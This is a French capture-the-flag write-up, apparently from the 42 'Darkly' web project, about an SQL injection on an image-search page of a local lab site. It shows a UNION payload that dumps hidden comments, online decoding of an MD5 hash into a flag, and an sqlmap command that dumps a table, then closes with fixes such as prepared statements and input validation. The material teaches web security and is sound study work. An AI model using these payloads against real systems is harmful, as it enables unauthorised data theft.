# Recherche

#### Suite de [12_SQL_injection_member](../../12_SQL_injection_member/Ressources/Readme.md).

- On peut trouver en bas de la page d'accueil  un bouton **SEARCH IMAGE**, qui nous amène sur une page ou l'on peut **rechercher des images** par leurs **ID**.

- En entrant **l'ID** `5`, on obtient:

```sql
ID: 5 
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

- En plus d'être [**suspect**](https://www.youtube.com/watch?v=McguBufbsQs), ce message nous indique que cette page est **vulnérable** face à une **Injection SQL**.

# Exploit

- Avec les **connaissances acquises** dans la **faille trouvé précédemment**, nous avons vu qu'il existe une **table** `list_images` qui contient les **colonnes** `id`, `url`, `title` et `comment`.

- On peut donc afficher les **colonnes** qui nous **intéressent** via la **requête suivante**:

```sql
1 UNION select url, comment from list_images
```

```text
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

- On peut utiliser <a href="https://md5decrypt.net/">MD5Decrypt</a> pour décrypter le **mot de passe**. On obtient alors: `albatroz`, soit `albatroz` en **minuscule**. en utilisant <a href="https://www.https://md5decrypt.net/Sha256/">MD5Decrypt</a> encore une fois, on peut obtenir le **hash sha256** de `albatroz`: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`.

# SQLMAP

- On peut utiliser **SQLMAP** pour **automatiser** la recherche de **faille SQL**:

```python
python3 sqlmap.py -u http://127.0.0.1:8080/index.php\?page\=searchimg\&id\=1\&Submit\=Submit\# --dump -T list_images -D Member_images
```

# Fix

- Pour éviter les **Injections SQL**, il faut utiliser des **requêtes préparées**, qui **séparent** les instructions SQL des données utilisateur.

```PHP
$pdo = new PDO('mysql:host=localhost;dbname=database', 'username', 'password');
$stmt = $pdo->prepare('SELECT * FROM list_images WHERE id = ?');
$stmt->execute([$_GET['id']]);
```

- Valider les **entrées utilisateur** pour s'assurer qu'elles **correspondent** au **format attendu**. Dans ce cas, vérifier que **l'ID** est un `int`.

```PHP
$id = $_GET['id'];
if (!filter_var($id, FILTER_VALIDATE_INT)) {
    die('Invalid input');
}
```

- Si les **requêtes préparées** ne sont pas une option, échapper **correctement** toutes les **entrées utilisateur** avant de les utiliser dans une **requête SQL**.

```PHP
$mysqli = new mysqli("localhost", "username", "password", "database");
$id = $mysqli->real_escape_string($_GET['id']);
$query = "SELECT * FROM list_images WHERE id = '$id'";
```
